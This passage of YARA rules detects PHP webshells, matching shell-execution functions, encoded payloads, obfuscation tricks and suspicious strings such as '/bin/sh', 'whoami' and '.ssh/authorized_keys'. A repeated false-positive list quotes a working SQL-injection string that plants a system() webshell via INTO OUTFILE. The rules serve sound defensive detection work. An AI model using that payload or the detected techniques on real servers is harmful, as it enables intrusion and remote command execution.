$callback18 = /\buasort[\t ]*\([^)]/ nocase wide ascii
$callback19 = /\buksort[\t ]*\([^)]/ nocase wide ascii
$callback20 = /\busort[\t ]*\([^)]/ nocase wide ascii
$callback21 = /\bpreg_replace_callback[\t ]*\([^)]/ nocase wide ascii
$callback22 = /\bspl_autoload_register[\t ]*\([^)]/ nocase wide ascii
$callback23 = /\biterator_apply[\t ]*\([^)]/ nocase wide ascii
$callback24 = /\bcall_user_func[\t ]*\([^)]/ nocase wide ascii
$callback25 = /\bcall_user_func_array[\t ]*\([^)]/ nocase wide ascii
$callback26 = /\bregister_shutdown_function[\t ]*\([^)]/ nocase wide ascii
$callback27 = /\bregister_tick_function[\t ]*\([^)]/ nocase wide ascii
$callback28 = /\bset_error_handler[\t ]*\([^)]/ nocase wide ascii
$callback29 = /\bset_exception_handler[\t ]*\([^)]/ nocase wide ascii
$callback30 = /\bsession_set_save_handler[\t ]*\([^)]/ nocase wide ascii
$callback31 = /\bsqlite_create_aggregate[\t ]*\([^)]/ nocase wide ascii
$callback32 = /\bsqlite_create_function[\t ]*\([^)]/ nocase wide ascii
$callback33 = /\bmb_ereg_replace_callback[\t ]*\([^)]/ nocase wide ascii
$m_callback1 = /\bfilter_var[\t ]*\([^)]/ nocase wide ascii
$m_callback2 = "FILTER_CALLBACK" fullword wide ascii
$cfp1 = /ob_start\(['\"]ob_gzhandler/ nocase wide ascii
$cfp2 = "IWPML_Backend_Action_Loader" ascii wide
$cfp3 = "<?phpclass WPML" ascii
//strings from private rule capa_gen_sus
// these strings are just a bit suspicious, so several of them are needed, depending on filesize
$gen_bit_sus1  = /:\s{0,20}eval}/ nocase wide ascii
$gen_bit_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
$gen_bit_sus6  = "self.delete"
$gen_bit_sus9  = "\"cmd /c" nocase
$gen_bit_sus10 = "\"cmd\"" nocase
$gen_bit_sus11 = "\"cmd.exe" nocase
$gen_bit_sus12 = "%comspec%" wide ascii
$gen_bit_sus13 = "%COMSPEC%" wide ascii
//TODO:$gen_bit_sus12 = ".UserName" nocase
$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
// bonus string for proxylogon exploiting webshells
$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
$gen_bit_sus21 = "\"upload\"" wide ascii
$gen_bit_sus22 = "\"Upload\"" wide ascii
$gen_bit_sus23 = "UPLOAD" fullword wide ascii
$gen_bit_sus24 = "fileupload" wide ascii
$gen_bit_sus25 = "file_upload" wide ascii
// own base64 func
$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
$gen_bit_sus30 = "serv-u" wide ascii
$gen_bit_sus31 = "Serv-u" wide ascii
$gen_bit_sus32 = "Army" fullword wide ascii
// single letter paramweter
$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
$gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
$gen_bit_sus35 = "crack" fullword wide ascii
$gen_bit_sus44 = "<pre>" wide ascii
$gen_bit_sus45 = "<PRE>" wide ascii
$gen_bit_sus46 = "shell_" wide ascii
$gen_bit_sus47 = "Shell" fullword wide ascii
$gen_bit_sus50 = "bypass" wide ascii
$gen_bit_sus51 = "suhosin" wide ascii
$gen_bit_sus52 = " ^ $" wide ascii
$gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
$gen_bit_sus55 = /\w'\.'\w/ wide ascii
$gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
$gen_bit_sus57 = "dumper" wide ascii
$gen_bit_sus59 = "'cmd'" wide ascii
$gen_bit_sus60 = "\"execute\"" wide ascii
$gen_bit_sus61 = "/bin/sh" wide ascii
$gen_bit_sus62 = "Cyber" wide ascii
$gen_bit_sus63 = "portscan" fullword wide ascii
//$gen_bit_sus64 = "\"command\"" fullword wide ascii
//$gen_bit_sus65 = "'command'" fullword wide ascii
$gen_bit_sus66 = "whoami" fullword wide ascii
$gen_bit_sus67 = "$password='" fullword wide ascii
$gen_bit_sus68 = "$password=\"" fullword wide ascii
$gen_bit_sus69 = "$cmd" fullword wide ascii
$gen_bit_sus70 = "\"?>\"." fullword wide ascii
$gen_bit_sus71 = "Hacking" fullword wide ascii
$gen_bit_sus72 = "hacking" fullword wide ascii
$gen_bit_sus73 = ".htpasswd" wide ascii
$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
// very suspicious strings, one is enough
$gen_much_sus7  = "Web Shell" nocase
$gen_much_sus8  = "WebShell" nocase
$gen_much_sus3  = "hidded shell"
$gen_much_sus4  = "WScript.Shell.1" nocase
$gen_much_sus5  = "AspExec"
$gen_much_sus14 = "\\pcAnywhere\\" nocase
$gen_much_sus15 = "antivirus" nocase
$gen_much_sus16 = "McAfee" nocase
$gen_much_sus17 = "nishang"
$gen_much_sus18 = "\"unsafe" fullword wide ascii
$gen_much_sus19 = "'unsafe" fullword wide ascii
$gen_much_sus24 = "exploit" fullword wide ascii
$gen_much_sus25 = "Exploit" fullword wide ascii
$gen_much_sus26 = "TVqQAAMAAA" wide ascii
$gen_much_sus30 = "Hacker" wide ascii
$gen_much_sus31 = "HACKED" fullword wide ascii
$gen_much_sus32 = "hacked" fullword wide ascii
$gen_much_sus33 = "hacker" wide ascii
$gen_much_sus34 = "grayhat" nocase wide ascii
$gen_much_sus35 = "Microsoft FrontPage" wide ascii
$gen_much_sus36 = "Rootkit" wide ascii
$gen_much_sus37 = "rootkit" wide ascii
$gen_much_sus38 = "/*-/*-*/" wide ascii
$gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
$gen_much_sus40 = "\"e\"+\"v" wide ascii
$gen_much_sus41 = "a\"+\"l\"" wide ascii
$gen_much_sus42 = "\"+\"(\"+\"" wide ascii
$gen_much_sus43 = "q\"+\"u\"" wide ascii
$gen_much_sus44 = "\"u\"+\"e" wide ascii
$gen_much_sus45 = "/*//*/" wide ascii
$gen_much_sus46 = "(\"/*/\"" wide ascii
$gen_much_sus47 = "eval(eval(" wide ascii
// self remove
$gen_much_sus48 = "unlink(__FILE__)" wide ascii
$gen_much_sus49 = "Shell.Users" wide ascii
$gen_much_sus50 = "PasswordType=Regular" wide ascii
$gen_much_sus51 = "-Expire=0" wide ascii
$gen_much_sus60 = "_=$$_" wide ascii
$gen_much_sus61 = "_=$$_" wide ascii
$gen_much_sus62 = "++;$" wide ascii
$gen_much_sus63 = "++; $" wide ascii
$gen_much_sus64 = "_.=$_" wide ascii
$gen_much_sus70 = "-perm -04000" wide ascii
$gen_much_sus71 = "-perm -02000" wide ascii
$gen_much_sus72 = "grep -li password" wide ascii
$gen_much_sus73 = "-name config.inc.php" wide ascii
// touch without parameters sets the time to now, not malicious and gives fp
$gen_much_sus75 = "password crack" wide ascii
$gen_much_sus76 = "mysqlDll.dll" wide ascii
$gen_much_sus77 = "net user" wide ascii
$gen_much_sus78 = "suhosin.executor.disable_" wide ascii
$gen_much_sus79 = "disabled_suhosin" wide ascii
$gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
$gen_much_sus81 = /strrev\(['"]/ wide ascii
$gen_much_sus82 = "PHPShell" fullword wide ascii
$gen_much_sus821= "PHP Shell" fullword wide ascii
$gen_much_sus83 = "phpshell" fullword wide ascii
$gen_much_sus84 = "PHPshell" fullword wide ascii
$gen_much_sus87 = "deface" wide ascii
$gen_much_sus88 = "Deface" wide ascii
$gen_much_sus89 = "backdoor" wide ascii
$gen_much_sus90 = "r00t" fullword wide ascii
$gen_much_sus91 = "xp_cmdshell" fullword wide ascii
$gif = { 47 49 46 38 }
condition:
not (
any of ( $gfp* )
)
and not (
any of ( $gfp_tiny* )
)
and (
any of ( $inp* )
)
and (
not any of ( $cfp* ) and
(
any of ( $callback* )  or
all of ( $m_callback* )
)
)
and
( filesize < 1000 or (
$gif at 0 or
(
filesize < 4KB and
(
1 of ( $gen_much_sus* ) or
2 of ( $gen_bit_sus* )
)
) or (
filesize < 20KB and
(
2 of ( $gen_much_sus* ) or
3 of ( $gen_bit_sus* )
)
) or (
filesize < 50KB and
(
2 of ( $gen_much_sus* ) or
4 of ( $gen_bit_sus* )
)
) or (
filesize < 100KB and
(
2 of ( $gen_much_sus* ) or
6 of ( $gen_bit_sus* )
)
) or (
filesize < 150KB and
(
3 of ( $gen_much_sus* ) or
7 of ( $gen_bit_sus* )
)
) or (
filesize < 500KB and
(
4 of ( $gen_much_sus* ) or
8 of ( $gen_bit_sus* )
)
)
)
)
}
rule SSC_SWEBSHELL_php_base64_encoded_payloads : FILE {
meta:
description = "php webshell containing base64 encoded payload"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
modified = "2022-09-19"
hash = "88d0d4696c9cb2d37d16e330e236cb37cfaec4cd"
strings:
$decode1 = "base64_decode" fullword nocase wide ascii
$decode2 = "openssl_decrypt" fullword nocase wide ascii
// exec
$one1 = "leGVj"
$one2 = "V4ZW"
$one3 = "ZXhlY"
$one4 = "UAeABlAGMA"
$one5 = "lAHgAZQBjA"
$one6 = "ZQB4AGUAYw"
// shell_exec
$two1 = "zaGVsbF9leGVj"
$two2 = "NoZWxsX2V4ZW"
$two3 = "c2hlbGxfZXhlY"
$two4 = "MAaABlAGwAbABfAGUAeABlAGMA"
$two5 = "zAGgAZQBsAGwAXwBlAHgAZQBjA"
$two6 = "cwBoAGUAbABsAF8AZQB4AGUAYw"
// passthru
$three1 = "wYXNzdGhyd"
$three2 = "Bhc3N0aHJ1"
$three3 = "cGFzc3Rocn"
$three4 = "AAYQBzAHMAdABoAHIAdQ"
$three5 = "wAGEAcwBzAHQAaAByAHUA"
$three6 = "cABhAHMAcwB0AGgAcgB1A"
// system
$four1 = "zeXN0ZW"
$four2 = "N5c3Rlb"
$four3 = "c3lzdGVt"
$four4 = "MAeQBzAHQAZQBtA"
$four5 = "zAHkAcwB0AGUAbQ"
$four6 = "cwB5AHMAdABlAG0A"
// popen
$five1 = "wb3Blb"
$five2 = "BvcGVu"
$five3 = "cG9wZW"
$five4 = "AAbwBwAGUAbg"
$five5 = "wAG8AcABlAG4A"
$five6 = "cABvAHAAZQBuA"
// proc_open
$six1 = "wcm9jX29wZW"
$six2 = "Byb2Nfb3Blb"
$six3 = "cHJvY19vcGVu"
$six4 = "AAcgBvAGMAXwBvAHAAZQBuA"
$six5 = "wAHIAbwBjAF8AbwBwAGUAbg"
$six6 = "cAByAG8AYwBfAG8AcABlAG4A"
// pcntl_exec
$seven1 = "wY250bF9leGVj"
$seven2 = "BjbnRsX2V4ZW"
$seven3 = "cGNudGxfZXhlY"
$seven4 = "AAYwBuAHQAbABfAGUAeABlAGMA"
$seven5 = "wAGMAbgB0AGwAXwBlAHgAZQBjA"
$seven6 = "cABjAG4AdABsAF8AZQB4AGUAYw"
// eval
$eight1 = "ldmFs"
$eight2 = "V2YW"
$eight3 = "ZXZhb"
$eight4 = "UAdgBhAGwA"
$eight5 = "lAHYAYQBsA"
$eight6 = "ZQB2AGEAbA"
// assert
$nine1 = "hc3Nlcn"
$nine2 = "Fzc2Vyd"
$nine3 = "YXNzZXJ0"
$nine4 = "EAcwBzAGUAcgB0A"
$nine5 = "hAHMAcwBlAHIAdA"
$nine6 = "YQBzAHMAZQByAHQA"
// false positives
// execu
$execu1 = "leGVjd"
$execu2 = "V4ZWN1"
$execu3 = "ZXhlY3"
// esystem like e.g. filesystem
$esystem1 = "lc3lzdGVt"
$esystem2 = "VzeXN0ZW"
$esystem3 = "ZXN5c3Rlb"
// opening
$opening1 = "vcGVuaW5n"
$opening2 = "9wZW5pbm"
$opening3 = "b3BlbmluZ"
// false positives
$fp1 = { D0 CF 11 E0 A1 B1 1A E1 }
// api.telegram
$fp2 = "YXBpLnRlbGVncmFtLm9"
// Log files
$fp3 = " GET /"
$fp4 = " POST /"
$fpa1 = "/cn=Recipients"
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 300KB and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and not any of ( $fp* ) and any of ( $decode* ) and
( ( any of ( $one* ) and not any of ( $execu* ) ) or any of ( $two* ) or any of ( $three* ) or
( any of ( $four* ) and not any of ( $esystem* ) ) or
( any of ( $five* ) and not any of ( $opening* ) ) or any of ( $six* ) or any of ( $seven* ) or any of ( $eight* ) or any of ( $nine* ) )
}
rule SSC_Swebshell_php_unknown_1
{
meta:
description = "obfuscated php webshell"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "12ce6c7167b33cc4e8bdec29fb1cfc44ac9487d1"
hash = "cf4abbd568ce0c0dfce1f2e4af669ad2"
date = "2021/01/07"
strings:
$sp0 = /^<\?php \$[a-z]{3,30} = '/ wide ascii
$sp1 = "=explode(chr(" wide ascii
$sp2 = "; if (!function_exists('" wide ascii
$sp3 = " = NULL; for(" wide ascii
condition:
filesize <300KB and all of ($sp*)
}
rule SSC_Swebshell_php_generic_eval
{
meta:
description = "Generic PHP webshell which uses any eval/exec function in the same line with user input"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "a61437a427062756e2221bfb6d58cd62439d09d9"
hash = "90c5cc724ec9cf838e4229e5e08955eec4d7bf95"
date = "2021/01/07"
modified = "2021-10-29"
strings:
// new: eval($GLOBALS['_POST'
$geval = /\b(exec|shell_exec|passthru|system|popen|proc_open|pcntl_exec|eval|assert)[\t ]*(\(base64_decode)?(\(stripslashes)?[\t ]*(\(trim)?[\t ]*\(\$(_POST|_GET|_REQUEST|_SERVER\s?\[['"]HTTP_|GLOBALS\[['"]_(POST|GET|REQUEST))/ wide ascii
//strings from private rule php_false_positive
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
// a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
$gfp1  = "eval(\"return [$serialised_parameter" // elgg
$gfp2  = "$this->assert(strpos($styles, $"
$gfp3  = "$module = new $_GET['module']($_GET['scope']);"
$gfp4  = "$plugin->$_POST['action']($_POST['id']);"
$gfp5  = "$_POST[partition_by]($_POST["
$gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
$gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
$gfp8  = "Smarty_Internal_Debug::start_render($_template);"
$gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
$gfp11 = "(eval (getenv \"EPROLOG\")))"
$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
// Log files
$gfp_3 = " GET /"
$gfp_4 = " POST /"
condition:
filesize < 300KB and not (
any of ( $gfp* )
)
and $geval
}
rule SSC_Swebshell_php_double_eval_tiny
{
meta:
description = "PHP webshell which probably hides the input inside an eval()ed obfuscated string"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "aabfd179aaf716929c8b820eefa3c1f613f8dcac"
date = "2021-01-11"
modified = "2021-09-29"
score = 50
strings:
$payload = /(\beval[\t ]*\([^)]|\bassert[\t ]*\([^)])/ nocase wide ascii
$fp1 = "clone" fullword wide ascii
$fp2 = "* @assert" ascii
$fp3 = "*@assert" ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize > 70 and filesize < 300 and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and #payload >= 2 and not any of ( $fp* )
}
rule SSC_Swebshell_php_obfuscated
{
meta:
description = "PHP webshell obfuscated"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/12"
hash = "eec9ac58a1e763f5ea0f7fa249f1fe752047fa60"
strings:
//strings from private rule php_false_positive
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
// a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
$gfp1  = "eval(\"return [$serialised_parameter" // elgg
$gfp2  = "$this->assert(strpos($styles, $"
$gfp3  = "$module = new $_GET['module']($_GET['scope']);"
$gfp4  = "$plugin->$_POST['action']($_POST['id']);"
$gfp5  = "$_POST[partition_by]($_POST["
$gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
$gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
$gfp8  = "Smarty_Internal_Debug::start_render($_template);"
$gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
$gfp11 = "(eval (getenv \"EPROLOG\")))"
$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_php_obfuscation_multi
$o1 = "chr(" nocase wide ascii
$o2 = "chr (" nocase wide ascii
// not excactly a string function but also often used in obfuscation
$o3 = "goto" fullword nocase wide ascii
$o4 = "\\x9" wide ascii
$o5 = "\\x3" wide ascii
// just picking some random numbers because they should appear often enough in a long obfuscated blob and it's faster than a regex
$o6 = "\\61" wide ascii
$o7 = "\\44" wide ascii
$o8 = "\\112" wide ascii
$o9 = "\\120" wide ascii
$fp1 = "$goto" wide ascii
//strings from private rule capa_php_payload
// \([^)] to avoid matching on e.g. eval() in comments
$cpayload1 = /\beval[\t ]*\([^)]/ nocase wide ascii
$cpayload2 = /\bexec[\t ]*\([^)]/ nocase wide ascii
$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase wide ascii
$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase wide ascii
$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase wide ascii
$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase wide ascii
$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase wide ascii
$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase wide ascii
$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase wide ascii
$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase wide ascii
$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
// TODO backticks
condition:
not (
any of ( $gfp* )
)
and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and (
// allow different amounts of potential obfuscation functions depending on filesize
not $fp1 and (
(
filesize < 20KB and
(
( #o1+#o2 ) > 50 or
#o3 > 10 or
( #o4+#o5+#o6+#o7+#o8+#o9 ) > 20
)
) or (
filesize < 200KB and
(
( #o1+#o2 ) > 200 or
#o3 > 30 or
( #o4+#o5+#o6+#o7+#o8+#o9 ) > 30
)
)
)
)
and (
any of ( $cpayload* ) or
all of ( $m_cpayload_preg_filter* )
)
}
rule SSC_Swebshell_php_obfuscated_encoding
{
meta:
description = "PHP webshell obfuscated by encoding"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/04/18"
strings:
// one without plain e, one without plain v, to avoid hitting on plain "eval("
$enc_eval1 = /(e|\\x65|\\101)(\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ wide ascii nocase
$enc_eval2 = /(\\x65|\\101)(v|\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ wide ascii nocase
// one without plain a, one without plain s, to avoid hitting on plain "assert("
$enc_assert1 = /(a|\\97|\\x61)(\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ wide ascii nocase
$enc_assert2 = /(\\97|\\x61)(s|\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ wide ascii nocase
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 700KB and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and any of ( $enc* )
}
rule SSC_Swebshell_php_obfuscated_encoding_mixed_dec_and_hex
{
meta:
description = "PHP webshell obfuscated by encoding of mixed hex and dec"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/04/18"
strings:
// "e\x4a\x48\x5a\x70\x63\62\154\x30\131\171\101\x39\111\x43\x52\x66\x51\
//$mix = /['"]\\x?[0-9a-f]{2,3}[\\\w]{2,20}\\\d{1,3}[\\\w]{2,20}\\x[0-9a-f]{2}\\/ wide ascii nocase
$mix = /['"](\w|\\x?[0-9a-f]{2,3})[\\x0-9a-f]{2,20}\\\d{1,3}[\\x0-9a-f]{2,20}\\x[0-9a-f]{2}\\/ wide ascii nocase
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 700KB and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and any of ( $mix* )
}
rule SSC_Swebshell_php_obfuscated_tiny
{
meta:
description = "PHP webshell obfuscated"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/12"
strings:
// 'ev'.'al'
$obf1 = /\w'\.'\w/ wide ascii
$obf2 = /\w\"\.\"\w/ wide ascii
$obf3 = "].$" wide ascii
//strings from private rule php_false_positive
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
// a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
$gfp1  = "eval(\"return [$serialised_parameter" // elgg
$gfp2  = "$this->assert(strpos($styles, $"
$gfp3  = "$module = new $_GET['module']($_GET['scope']);"
$gfp4  = "$plugin->$_POST['action']($_POST['id']);"
$gfp5  = "$_POST[partition_by]($_POST["
$gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
$gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
$gfp8  = "Smarty_Internal_Debug::start_render($_template);"
$gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
$gfp11 = "(eval (getenv \"EPROLOG\")))"
$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_php_payload
// \([^)] to avoid matching on e.g. eval() in comments
$cpayload1 = /\beval[\t ]*\([^)]/ nocase wide ascii
$cpayload2 = /\bexec[\t ]*\([^)]/ nocase wide ascii
$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase wide ascii
$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase wide ascii
$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase wide ascii
$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase wide ascii
$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase wide ascii
$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase wide ascii
$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase wide ascii
$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase wide ascii
$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
// TODO backticks
condition:
filesize < 500 and not (
any of ( $gfp* )
)
and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and (
any of ( $cpayload* ) or
all of ( $m_cpayload_preg_filter* )
)
and
( ( #obf1 + #obf2 ) > 2 or #obf3 > 10 )
}
rule SSC_Swebshell_php_obfuscated_str_replace
{
meta:
description = "PHP webshell which eval()s obfuscated string"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/12"
hash = "691305753e26884d0f930cda0fe5231c6437de94"
hash = "7efd463aeb5bf0120dc5f963b62463211bd9e678"
hash = "fb655ddb90892e522ae1aaaf6cd8bde27a7f49ef"
hash = "d1863aeca1a479462648d975773f795bb33a7af2"
hash = "4d31d94b88e2bbd255cf501e178944425d40ee97"
hash = "e1a2af3477d62a58f9e6431f5a4a123fb897ea80"
strings:
$payload1 = "str_replace" fullword wide ascii
$payload2 = "function" fullword wide ascii
$goto = "goto" fullword wide ascii
//$hex  = "\\x"
$chr1  = "\\61" wide ascii
$chr2  = "\\112" wide ascii
$chr3  = "\\120" wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
